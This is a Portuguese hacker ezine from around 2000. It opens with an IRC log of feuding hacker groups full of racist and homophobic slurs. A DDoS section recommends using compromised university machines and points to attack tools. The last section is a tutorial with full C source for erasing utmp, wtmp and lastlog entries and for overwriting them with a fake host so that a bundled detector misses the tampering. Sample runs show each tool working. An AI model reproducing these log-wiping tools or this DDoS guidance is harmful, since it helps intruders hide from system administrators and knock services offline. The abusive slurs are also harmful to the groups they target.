xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



   Hehehehe. Vo colar aki um resumo dum chat que aconteceu qdo a tdk 
havia recem acabado. 
   O sk e o phrog entraram no #fashion_eh_meu_ovo e comecaram a zoar a
dk, ae o cliptor, chefe da s13, achava q o nick do sk era relacionado
ao antigo nome do grupo (SK, Shadow Knights) e que alguem tava querendo
encrimina-lo. Ae deu rolo com o cacaio e tal. 
   O sk devia tava achando q a shadowknights era um grupo q saiu da 
deathknights (pela semelhanca no nome), etc... 
   Ae o n4rfy entro xingando o sk e o phrog partiu pra defender o seu
amante. =)
   Deu mto rolo la no knal e eu fikei na minha, soh rindu enquanto os
loko viajavam.
   Vamu da uma olhada no resumo do log...



<sk> ahahahahahahahahhahahahahhahahahahaha
<Tinkertrain> sk: ?
<sk> ahahahahahahahahhahahahahhahahahahaha
<Tinkertrain> o o kra ae..
<Tinkertrain> quem eh esse marginal ?
<sk> ahahahahahahahahahahahahahhahahaahhahahahahaahahha
<Tinkertrain> tem gente q nao se toca
<sk> ahahahahahahahahahahahahahhahahaahhahahahahaahahha
<Tinkertrain> :)
<sk> ahahahahahahahahahahahahahhahahaahhahahahahaahahha
<Tinkertrain> sk: q engracado!
<phrog> eh verdade que a fabrica de fitas TDK acabou?
<Tinkertrain> haha
<sk> isso tudo eh a emocao da tdk terminar
<sk> ahahahahahhahahahahahahahhhahahaha
<phrog> tipo
<phrog> agora soh usarei fitas basf
<sk> sk = Shadow Knights
<phrog> e vc
<sk> tem cada nego com imaginacao
<sk> bah
<sk> quero q a TDK FODA-SE
<Cliprtor_Away> Bah!
<Camalis> vai tomar no seu cu
<phrog> calma
<Cliprtor_Away> Ae passado!
<Cliprtor_Away> Shadow Knights não existe mais.
<Camalis> filho da puta
<Camalis> =/
<Cacaio> seus desinteressados
<Cliprtor_Away> Pesso desculpas a TDK por esse débil mental que 
                apareceu. Esclarecimento: Ele naum eh da es Shadow 
                Knights.. Tanto que naum sabe que agora eh s13!
<Cliprtor_Away> Eh bom esclerecer pra naum ficar mau com ninguém.
<Cacaio> Cliprtor_Away: eu gosto de respeito. o mesmo respeito q vc 
         teve comigo eu terei com vc.
<Camalis> meu deus
<Cliprtor_Away> [Cacaio]: Obrigado.
<Camalis> Cacaio: /kb sk
<sk> quero q a TDK foda-se
<Cliprtor_Away> Não deem bola pra esse alguém aí.
<sk> quero q a TDK foda-se
<troy_psx> sk que isso ciumes reprimido?
<Cacaio> sk: probrema seu hehe
<sk> quero q a TDK foda-se
<Camalis> huaeuhaeuhaeuaehuaehae
<n4rfy> seus gay
<n4rfy> vao se fude
<n4rfy> haAhHAhahAhahAHAhAhAhhaHahAhA
<sk> quero q a TDK foda-se
<Feffe> bah
<Feffe> dah um jeito ae
<sk> quero q a TDK foda-se
<n4rfy> o sk
<n4rfy> voce fede seu filho da puta
<n4rfy> vai se fude
<nosmiles`auei> sk como assim ?
<nosmiles`auei> ce ker k a TDK pegue o proprio pinto e meta no cú ?
<|midnight|> ban
<n4rfy> eu lembro de voce do r00t sua nega
<n4rfy> se fudeu em puta
<n4rfy> fecho o canal
<n4rfy> seu nego
<n4rfy> vai se fude vadia
<n4rfy> pau no cu
<n4rfy> c fede pia
<n4rfy> ta com ciume sua puta
<n4rfy> vai se fude nega
<n4rfy> sua mae tem xule nas teta
<n4rfy> aquela porca fidida
<n4rfy> ela fede pia
<|midnight|> fdp
*** sk was kicked by Cacaio (Algum dia, quando tivermos dominado os 
ventos, as ondas, as marés e a gravidade... utilizaremos as energias do
amor. Então, pela segunda vez na história do mundo, o homem descobrirá 
o fogo.)
<nosmiles`auei> hhehee
<Camalis> aehuuaehaeuaehuaehaeuh
<n4rfy> haAhHAhahAhahAHAhAhAhhaHahAhA
<|midnight|> auhuahahu
<Cacaio> haehaehaehaehaehaehaehae
<phrog> ei
<phrog> cacaio... vc naum vai escrever uma declaracao emocionado e 
        mandar pra hax0rnews?
<Cacaio> phrog: to chorando oh =:~~ 
<Cacaio> blé
<n4rfy> ele fede pia
<n4rfy> eu conhece ele do r00t
<n4rfy> ele se acha o homen dá bl0w
<n4rfy> ele caga pra dentro
<n4rfy> haAhHAhahAhahAHAhAhAhhaHahAhA
<Cacaio> haehaehaehaehaehaehea
<phrog> tipo
<phrog> ele te owna narfy
<phrog> =)
<n4rfy> claru
<n4rfy> seis sao tudo gay
<phrog> tipo
<phrog> gay eh quem rouba nick do s13
<n4rfy> olhem o topico
<n4rfy> acabo
<n4rfy> :(
<n4rfy> seus viado
<n4rfy> vao se fude
<phrog> poutz
<n4rfy> robei o nick do kra
<Cacaio> kem roubou nick do s13?
<n4rfy> usei o bo
<n4rfy> nao
<n4rfy> foi netbus
<n4rfy> haAhHAhahAhahAHAhAhAhhaHahAhA
<n4rfy> sou hacker agora robei o nick
<phrog> tipo
<phrog> q eu saiba n4rfy eh do s13
<n4rfy> serio?
<phrog> e naum um doente q usa scripts coloridos
<n4rfy> legal
<n4rfy> o sua puta
<n4rfy> eu ia faze a zine nega fidida
<n4rfy> c fede pia
<phrog> zine?
<phrog> qq isso tem haver?
<n4rfy> eu tenho dupla personalidade nega fidida
<n4rfy> vai se fude
<n4rfy> c fede 
<phrog> kralho o kra naum tem sequencia de raciocinio
<nosmiles> so tem viadinho aki frog
<phrog> e ainda acha graca das proprias asneiras q fala
<nosmiles> so tem bixa loouuuuuuuuuuucaaaaaaaaa
<phrog> ;*
<nosmiles> so tem piruuuuuuuuuuuaaaaaaaaaaaaaa
<nosmiles> ui ui ui
<nosmiles> de lingua
<nosmiles> :@
<Camalis> nossa
<Camalis> q viadaji
<Camalis> huaeuhaeuah
<phrog> poutz
<n4rfy> phrog c é gay né? fala pra nois
<n4rfy> porriso que tinha que ter op aqui
<n4rfy> dai ia ter menos gay como voce no canal
<n4rfy> mula veia
<phrog> po
<phrog> issso eh interessante
<phrog> os negos se acham os anarquistas
<phrog> e chamam os outros de gays
<Cacaio> phrog: eu chamo d gays sim... tenho ideias anarcho e sou bi
<Cacaio> hehe
<nosmiles> aahahahaha
<Camalis> euahauehaeuhaeuea
<n4rfy> falow ae!!!
<phrog> o narfy deve ir hackar algo leet... afinal ele eh do s13
<n4rfy> nem kra
<n4rfy> eu só ia faze a zine deles mesmo
<phrog> tipo
<phrog> zine hahah
<phrog> kra se mata e tal
<n4rfy> vai se fude
<n4rfy> falow to indo
<phrog> haha 
<n4rfy> to ocupado agora pia
<n4rfy> tua mae nao me deixa em paz pia
<n4rfy> ela mando voce ir durmi
<phrog> ahuehuehue
<xe0n> auhuhahuauuaua ver lamo bravo eh a coisa mais engracada que tem.
<nosmiles> uhaeuhaeuhaeuhaeuhaeuhaeuheauhaeuhauheauhe
<phrog> eh foda
<phrog> lamo putinho, sem argumentos
<nosmiles> po
<nosmiles> ve lamo tbm eh legal
<nosmiles> aki tem um monte
<nosmiles> eu
<nosmiles> cacaio
<nosmiles> struck
<Cliprtor_Away> TEM EU!
<nosmiles> quem for lammo levanta os braco
<phrog> nao
<phrog> vcs sao h4x0rs
<phrog> sabem a teqneek do frontpage
* Cacaio lamo romantico
<DaveMustaine> |
* DaveMustaine lamo
<phrog> ah perae
<phrog> 6 falam d+



   Hehehehehehe!!!
   Hilario. Eu tive q colar issu aki por que enquanto lia essa desova
pensava que issu ia acabar em guerra entre esses retardados. =)
   Mas vo deixa umas coisas claras...

phrog - Lokinhu da poweroff. De vez em quando tem umas recaidas e comeca
        a fala besteira nos knais. =)
        Ah!!! Contradizendo ele, a dk nunca ownou por fp. Mas como tinha
        gente q nem era da dk no knal vamu fazer de conta que era pros
        outros.

sk  -  Eh o nick dum loko da ex-bow e atualmente na poweroff. Ele usa
       esse nick muito antes de surgir a Shadow Knights.
       Internado no mesmo hospicio do phrog.

Cacaio - Founder da falecida DK. Tem uma paciencia divina pra aguentar
         tanto maluko no knal. Mas como ninguem eh di ferro, acabou 
         brigando com o Cliptor atualmente.

         
N4rfy - Esta internado no hospicio do lado do phrog e do sk. Esse eh o
        motivo do desentendimento deles: os hospicios sao rivais.

Cliptor - Founder da s13. Fugiu do mesmo hospicio do n4rfy e fika 
          viajando achando que tudo o que acontece e' contra ele.

Tinkertrain  \
Camalis       |
troy_psx      |
Feffe          \ Coadjuvantes que fikam em segundo plano rindo, xingando
nosmiles       / e falando bobagem.
midnight      |
xe0n          |
DaveMustaine /


   Huahuahuahua!!!
   Agora porque eu fiz essa materia tao besta??? Primeiro para voce rir
e segundo pra explicar por que eu havia deixado a dk (antes dela acabar)
e nao pretendo entrar em nenhum grupo atualmente.
   Como 6 viram, ae nesse log tem gente da poweroff, ex-tdk e s13. Atual-
mente nenhum desses grupos se dao bem. Ha um tempo atras qdo alguns mem-
bros da poweroff formavam a bl0w, eu acabei me queimando com eles por
causa de um MASS HACK pela dk.
   C na epoca desse chat eu continuasse na dk, teria q optar entre 
defender ela ou fika do lado da poweroff. Com issu, eu imagino com qtos
eu nao iria arranjar inimizade.
   Atualmente eu frequento knais desses 3 grupos rivais e sou amigo 
deles, porem nao sou membro desses grupos exatamente para nao ter que
um dia decidir do lado de quem eu vou fikar. Sakaram???
   A fatal 3rror nao eh um grupo. Eh apenas um grupo de malucos de
cabelos raspados que decidiram trazer um pouco mais de cultura para as
suas vidas.
   Realmente eu nao to afim de participar de grupo nenhum, mas posso
colaborar com alguns, como fazia com a s13 nas 1as edicoes da zine. Agora
como surgiu a f3, nem colaboraracoes nao faco mais.
   E eh issu ae. Espero q tenha deixado claro.
   Qto aos nomes q aparecem nesse log... Decidi que nao havia porque deu
anonimizar eles, ja q  issu nao deve constranger ninguem. =)
   E por falar em nomes, batizei meu sapinhu de estimacao de phrog. As
vezes ele escapa e sobe em cima da geladeira. Ae eu falo "Desce dae 
phrog!!! Ou o papai nao te da papa!!!". De vez em quando ele vomita em
cima o sofa. Ele sabe que nao e' pra ele fazer issu....
   Sapos sao engracados...















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~         08 - DDoS         ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_          s0laris          _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



Bom.. vou falar sobre DDoS (Distributed Denial of Service). Traduzindo 
ficaria Negação de Serviço Distribuída. Pela tradução você já tem uma 
idéia do que significa. Mas, mesmo se assim você não entendeu, significa
fazer com que uma determinada máquina na rede pare de responder à 
requisições, ou seja, os usuários legítimos dela não irão utilizar seus
serviços, enquanto o ataque DDoS se suceder. Esse foi um ataque bastante
utilizado nos meses fevereiro/março nos sites mais visitados do mundo, 
como Yahoo, Altavista, Amazon.com, etc. Note que esses sites ficaram 
indisponíveis durante horas e horas. Aqui no Brasil também houveram e 
ainda há ataques DDoS. Sites como Cade?, Zipmail, UOL, entre outros foram
atacados. Por exemplo, na madrugada de 19/04 para 20/04 os serviços do
UOL, provedor de acesso e notícias on line, ficaram indisponíveis aos 
seus usuários durante cerca de 6 horas. Adivinhem quem estava por trás
do ataque DDoS... opa! Vamos ao que interessa... 

O ataque DDoS consiste em enviar um grande número de requisições à uma
determinada máquina. Esta vai tentar responder. Até que no começo ela 
provavelmente irá conseguir responder às requisições. Mas se as 
requisições forem contínuas, vai ter um momento em que a máquina não 
terá capacidade para respondê-las e assim vai deixar de responder a 
qualquer outra máquina que a requisite. O objetivo foi realizado! 
Ninguém agora consegue visualizar sequer uma html do seu site... nada!
É como se a máquina estivesse desligada. Vou mostrar graficamente mais
ou menos como funciona um ataque:


                          ____________ _____
                          | Largura  | |   |        
                          |   de     | | _ |
                          |banda alta| |   |----|
                         /|__________| |   |    |
                       /     |    |    |___|    |
  ALVO               /          |               |
________           /            |               |
|      |         /        ____________ _____    |      ____________ _____
|      | <--   /          | Largura  | |   |    |      |          | |   |
|Server| ___ /____________|   de     | | _ |    | <--  |   VOCÊ   | | _ |
|      |     \            |banda alta| |   | --------- |          | |   |
|      |       \          |__________| |   |    |      |__________| |   |
|      |         \           |    |    |___|    |         |    |    |___|
|______|           \            |               |
                     \          |               |
                       \  ____________ _____    |
                         \| Largura  | |   |    |
                          |   de     | | _ |    |
                          |banda alta| |   |----|
                          |__________| |   |
                             |    |    |___|

Nota: As máquinas de largura de banda alta são mais eficientes, mas 
computadores pessoais podem ser usados também.   

 Você deve ter perguntando antes: mas como fazer grandes números de 
requisições?? Simples... para isso usamos outros computadores (o que de
uma certa forma nos protege, se atacássemos diretamente dos nossos 
seríamos descobertos rapidamente). Em um ataque DDoS usamos muitos 
computadores. Se você não quiser usar tantos computadores assim, pode
praticar o ataque usando computadores de largura de banda alta, 
geralmente encontrados nas Universidades americanas. Desse modo será 
preciso poucos computadores, já que eles têm enorme poder de ataque. 
Nos ataques que pratiquei usei máquinas de Universidades americanas. 
Algumas chegavam a ter uma largura de banda de 200 MB... você tem idéia
do que significa isso? Bom.. vamos ao que interessa... O ataque funciona
dessa forma: você envia um pacote à essas máquinas, elas "entendem" que
devem requisitar intermitentemente o servidor, que será o alvo. Assim,
o alvo não suportará as requisições e ficará indisponibilizado.

 Está louco para fechar esse arquivo e ir logo praticar um ataque, hein?
Mas não é tão simples assim (imaginem se fosse!). As máquinas que você 
deve usar para suceder o ataque devem estar infectadas com um servidor 
de serviço. Ou seja, você deve infectá-las, ou conseguir ips de algumas 
com algum amigo. Eu não estou colocando ips à disposição, pois acho 
"anti-ético". Os programas mais usados para ataques são: TFN (Tribe 
Flood Network), TFN2k, trin00, e agora um mais poderoso, que age em 
conjunto com esses: o mstream. 

 Você pode encontrar ferramentas para praticar um ataque em: 
http://www.ussrback.com/distributed.htm















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~   09 - Fucando com Logs   ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~




   Porra.... tem muita gente que nao da atencao a issu e acaba c fudendo
porque os admins que pareciam burros, sao inteligentes o suficiente para
verificar os logs do seu sistema depois que foi hackeado.
   Aki vou mostrar algumas t3kn33ks tanto para hackers como para admins
sobre como usar, apagar e sobrescrever logs.
   Antes de mais nada faca um backup dos seguintes arquivos:
/var/run/utmp
/var/log/wtmp
/var/log/lastlog



   1. Entendendo...
   O linux usa basicamente 3 tipos de logs. Lastlog, UTMP, WTMP.
   O Lastlog grava o tty, host e time do user assim que ele da exit.
   O UTMP e WTMP gravam o login type, login pid, tty device, tty, user,
host, exit status, session ID, time e ip no login e na logout.
   Existe tbm o syslogd que faz o log de mensagens do kernel incluindo
conexoes remotas. Voce pode verificar os arquivos em /etc/syslog.conf mas
isto nao inclui no objetivo deste texto.


   2. Lendo...
   Os dois metodos mais conhecidos de ver os dados gravados no log sao
atravez dos comandos who (ou w) e lastlog.
   O who pega os dados no UTMP enquanto o lastlog... adivinhe. =)



   3. Apagando...
   Na certa voce conhece um programinha chamado zap??? Ele serve para
apagar estes 3 logs (UTMP, WTMP e LastLog). 
   C voce ainda nao tem ele vou bota aki o src do zap2 (eu sei q ta
desatualizado mas eh soh para aprendizado).

<++> logs/z2.c
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/var/log/wtmp"
#define UTMP_NAME "/var/run/utmp"
#define LASTLOG_NAME "/var/log/lastlog"

int f;

void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;

  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}

void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;

    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {

     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}

void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;

     if ((pwd=getpwnam(who))!=NULL) {

        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }

    } else printf("%s: ?\n",who);
}

main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1]);
     }else
    printf("Error.\n");
}

<-->

   Okay. Agora vamos usa-lo pra ver como funfa.

# who
root       tty1     Mar 12 09:01
struck     tty2     Mar 12 09:04
# lastlog -u struck
Username         Port     From             Latest
struck           tty3                      Sun Mar 12 09:07:25 2000
# ./z
Error.
# ./z struck
# who
root       tty1     Mar 12 09:01
# lastlog -u struck
Username         Port     From             Latest
struck                                     **Never logged in**
#

   Viu?? Ele simplesmente apagou todos os dados relacionados ao username.




   4. Descobrindo...
   Achei este programa na rwx05. Ele olha os arquivos onde o log eh salvo
a procura de dados que foram apagados.
   Ae vai o programa...

<++> logs/logs.c

#include <stdio.h>
#include <utmp.h>
#include <lastlog.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <shadow.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define UTMP "/etc/utmp"
#define UTMP2 "/var/run/utmp"
#define WTMP "/etc/wtmp"
#define WTMP2 "/var/log/wtmp"
#define LASTLOG "/var/log/lastlog"
#define SIM 1
#define NAO 0
#define MAX 14
#define NL putchar('\n')
#define BEEP putchar(7)

typedef char boolean;

struct user{
       struct utmp u;
       struct user *p;
       }*s;

struct utmp cmp;
struct lastlog cmp2;

void insere(struct utmp *);
void print(struct user *);
void ajuda(const char *);
void print_wtmp(struct user *);
boolean procura(struct user *, const char *);
boolean bash_history(const char *);
void never_login(const char *, const char *);

int main(int argc, char *argv[]){

struct utmp actual;
struct lastlog actual2;
struct spwd *utilizador;
struct passwd *username;

boolean intrusao=NAO,
        resto=SIM,
        beep1=NAO;
int intrusoes=0,
    i;

int fd;

time_t hora;
  
  for(i=0; i<argc; i++)
     if(argv[i][0]=='-')
       switch(argv[i][1]){
       case 'h':{
                 ajuda(argv[0]);
                 exit(0);
                }
       case 'b':{
                 beep1=SIM;
		 break;
                }
       case 'u':{
                 resto=NAO;
                 break;
                }
       default:{
                puts("Opcao desconhecida");
                exit(1);
                }
       }


  s=NULL;
  memset(&cmp, 0, sizeof(struct utmp));    
  memset(&cmp2, 0, sizeof(struct lastlog));   

  if((fd=open(UTMP, O_RDONLY))<0){
    if((fd=open(UTMP2, O_RDWR))<0){
      perror("utmp");
      exit(1);
      }
     }
 
  time(&hora);
  printf("%s\n", ctime(&hora));
 
  printf("Analizando entradas do 'utmp'...\n");
  while(read(fd, &actual, sizeof(actual))>0){
    if(!memcmp(&actual, &cmp, sizeof(struct utmp)))
      intrusao=SIM;
      insere(&actual);
  }
  

  
  if(intrusao){
    NL;
    if(beep1)
      BEEP;
    printf("**********\n");
    printf("* AVISO: * As entradas do 'utmp', foram manipuladas!!!!!\n");
    printf("**********\n");
    printf("Users correctamente logged on:\n");
    printf("User\t\tLogged on em\tdev\n");
    print(s);
    printf("Faca 'ps -aux' para procurar processos de users ilegais!\n");
    } 
  else
   puts("OK!");
  
  if(!resto)
    exit(0);
 
  printf("----------------------------------\n");

  if((fd=open(WTMP, O_RDONLY))<0)
    if((fd=open(WTMP2, O_RDONLY))<0){
      perror("wtmp");
      exit(1);
    }
  
  NL;

  printf("Analizando entradas do 'wtmp'...\n");
    
  s=NULL;
  while(read(fd, &actual, sizeof(struct utmp))>0){
    if(!memcmp(&actual, &cmp, sizeof(struct utmp)))
        intrusoes++;
        insere(&actual);
  }
 
     
  if(intrusoes!=NAO){
    printf("Foram 'apagadas' um total de %d entradas!\n\n", intrusoes);
    print_wtmp(s);
    }
   else
    puts("OK!");
   

  printf("----------------------------------\n");
  
  if(getuid()!=0)
    if(fopen("/etc/shadow", "r")==NULL){
      printf("Precisa ser root para continuar!!\n");
      exit(1);
      } 

  if((fd=open(LASTLOG, O_RDWR))>=0){
    printf("Analizando entradas do 'lastlog'...\n");
    intrusoes=0;
 
    puts("Utilizadores com entradas 'apagadas':");
    while((utilizador=getspent())!=NULL){
      if(utilizador->sp_pwdp[0]!='*'){
        username=getpwnam(utilizador->sp_namp);
        lseek(fd, username->pw_uid * sizeof(struct lastlog), SEEK_SET);
        if(read(fd, &actual2, sizeof(struct lastlog))==-1){
          perror(LASTLOG);
          break;
	  }
        if(!memcmp(&cmp2, &actual2, sizeof(struct lastlog))){
          if(procura(s, utilizador->sp_namp)){
            intrusoes++;
            printf("-> %s\n", utilizador->sp_namp);
	    }
          else
           if(bash_history(username->pw_dir)){
             intrusoes++;
             printf("-> %s\n", utilizador->sp_namp);
	     }
	   else
	     never_login(utilizador->sp_namp, username->pw_dir);
	  }
       }
   }
}
else
  {
   printf("Nao foi possivel localizar o ficheiro 'lastlog'\n");
   exit(1);
  }

  if(intrusoes!=NAO)
    printf("\nForam apagadas pelo menos %d entradas\n", intrusoes);
    else
       puts("\nOK!");
             
}

void insere(struct utmp *k){
struct user *novo;

  if((novo=(struct user *) malloc(sizeof(struct user)))==NULL){
    puts("Erro a alocar memoria!");
    exit(1);
    }

  memcpy(&novo->u, k, sizeof(struct utmp));
  novo->p=s;
  s=novo;
}


void print(struct user *x){

  if(x==NULL)
    return;

  if(!memcmp(&x->u, &cmp, sizeof(struct utmp)))
    printf("??????\t\t??????\t\t??????\n");
  else
   if(x->u.ut_type >=7 && x->u.ut_type <=8)
     printf("%s\t\t%s\t\t%s\n", x->u.ut_user, x->u.ut_host, x->u.ut_line);
 
  print(x->p);

}

void print_wtmp(struct user *x){

   if(x==NULL)
     return;

   if(!memcmp(&x->u, &cmp, sizeof(struct utmp))){
    printf("entrada 'apagada' depois de:\n");
    if(memcmp(&x->p->u, &cmp, sizeof(struct utmp))!=0){
     printf("%s", ctime(&x->p->u.ut_time));
     if(x->p->u.ut_type >=7 && x->p->u.ut_type <=8)
       printf("(%s)\n", x->p->u.ut_name);
    }
    else
     printf("????????????????????????\n");

     NL; 
   }

   print_wtmp(x->p);
}

void ajuda(const char *s){
printf("======RwX Labs 1998=====\n");
printf("Uso: %s [-opcoes]\n", s);
printf("        -h imprime este help e sai\n");
printf("        -b beep ao encontrar anomalias\n");
printf("        -u apenas testa utmp\n");

}

boolean procura(struct user *x, const char *s){

   if(x==NULL)
     return(NAO);

   if(!strcmp(s, x->u.ut_name))
     return(SIM);

   procura(x->p, s);
}


boolean bash_history(const char *s){
static char *dir;

  if((dir=(char *) malloc(strlen(s)+14))==NULL){
    puts("Erro a alocar memoria!!");
    exit(1);
    }

  sprintf(dir, "%s/.bash_history", s);

  if(fopen(dir, "r")==NULL)
    return(NAO);

    return(SIM);

} 

void never_login(const char *s, const char *dir){

printf("?? %s\n", s);
printf("nao possui nenhuma entrada em 'wtmp'\n");
printf("o arquivo '%s/.bash_history' nao existe\n", dir);
printf("provavelmente nunca usou o sistema!!\n");

}

<-->

   Agora vamos usar e ver como funciona...

# ./logs
Sun Mar 12 10:01:20 2000

Analizando entradas do 'utmp'...

**********
* AVISO: * As entradas do 'utmp', foram manipuladas!!!!!
**********
Users correctamente logged on:
User		Logged on em	dev
??????		??????		??????
root				tty1
Faca 'ps -aux' para procurar processos de users ilegais!
----------------------------------

Analizando entradas do 'wtmp'...
Foram 'apagadas' um total de 1 entradas!

entrada 'apagada' depois de:
Sun Mar 12 10:00:15 2000
(root)

----------------------------------
Analizando entradas do 'lastlog'...
Utilizadores com entradas 'apagadas':

OK!
# 

   Prontinhu... Assim voce percebe que alguem andou mechendo em seus logs.
Voce eh um bom admin.
   Vamos testar outra coisa agora...
   Recupere os seus arquivos UTMP, WTMP e LastLog originais (voce fez
backup neh???) para passarmos para o proximo topic.
   Se voce nao fez backup faca o seguinte: Tire todos os outros usuarios
conectados no momento e deixe apenas o root. Agora apague os files
listados la em cima e depois crie-os com touch. Logue novamente com o
usuario q voce estava usando (no nosso caso struck).





   5. Sobrescrevendo...
   Agora virar o jogo pro nosso lado novamente...
   Baseado no zap eu fiz este programinha que ao invez de somente apagar
os dados ele cria novos e escreve em cima dos antigos.

<++> logs/cls.c

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>

#define WTMP_NAME "/var/log/wtmp"
#define UTMP_NAME "/var/run/utmp"
#define LASTLOG_NAME "/var/log/lastlog"

int f;

void kill_utmp(char *who, char *myhost)
{
    struct utmp utmp_ent;

  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
         bzero((char *)&utmp_ent,sizeof( utmp_ent ));
         lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
         utmp_ent.ut_type=USER_PROCESS;
         utmp_ent.ut_pid=getpid();
         strcpy(utmp_ent.ut_line,ttyname(0)+strlen("/dev/"));
         strcpy(utmp_ent.ut_id,ttyname(0)+strlen("/dev/tty"));
         time(&utmp_ent.ut_time);
         strcpy(utmp_ent.ut_user,who);
	 strcpy(utmp_ent.ut_host,myhost);
         utmp_ent.ut_addr=0;
         write (f, &utmp_ent, sizeof (utmp_ent));
         }
     close(f);
  }
}

void kill_wtmp(char *who, char *myhost)
{
    struct utmp utmp_ent;
    long pos;

    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {

     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_user,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               utmp_ent.ut_type=USER_PROCESS;
               utmp_ent.ut_pid=getpid();
               strcpy(utmp_ent.ut_line,ttyname(0)+strlen("/dev/"));
               strcpy(utmp_ent.ut_id,ttyname(0)+strlen("/dev/tty"));
               time(&utmp_ent.ut_time);
               strcpy(utmp_ent.ut_user,who);
               strcpy(utmp_ent.ut_host,myhost);
               utmp_ent.ut_addr=0;
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}

void kill_lastlog(char *who, char *myhost)
{
    struct passwd *pwd;
    struct lastlog newll;

     if ((pwd=getpwnam(who))!=NULL) {

        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            time(&newll.ll_time);
            strcpy(newll.ll_line,ttyname(0)+strlen("/dev/"));
            strcpy(newll.ll_host,myhost);
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }

    } else {
            printf("%s ?\n",who);
            exit(1);
    }
}

main(int argc,char *argv[])
{
    if (argc==3) {
        kill_lastlog(argv[1],argv[2]);
        kill_wtmp(argv[1], argv[2]);
        kill_utmp(argv[1],argv[2]);
     }else
    printf("Use:\n %s <name> <fake_host>\n",argv[0]);
}

<-->

   Atencao!!! Teste com os logs recuperados pois ele nao vai encontrar os
que ja foram apagados.
   Depois de recuperar os logs... Vamu testa-lo:

# ./a.out struck 222.222.222.222
# who
root       tty1     Mar 12 09:01
struck     ttyp0    Mar 12 10:23 (222.222.222.222)
# lastlog -u struck
Username         Port     From             Latest
struck           ttyp0    222.222.222.222  Sun Mar 12 10:23:02 2000
#

   Viu que maneiro???
   Com este programa voce pode inventar um host, que sera gravado em cima
do original e assim nao vai sumir do who e lastlog.
   Vamos ver se o logs.c detecta as entradas manipuladas...

# ./logs
Sun Mar 12 10:23:15 2000

Analizando entradas do 'utmp'...
OK!
----------------------------------

Analizando entradas do 'wtmp'...
OK!
----------------------------------
Analizando entradas do 'lastlog'...
Utilizadores com entradas 'apagadas':

OK!
# 

   Invisivel heim??
   Que ira perceber que voce trocou o seus dados??
   Uma coisa maneira de c fazer eh colocar um host como "nasa.org" para
que o admin fear u.
   E eh issu ae. Achu que ja falei demais.















        _xXXXP^''                   ``^YXXXx_
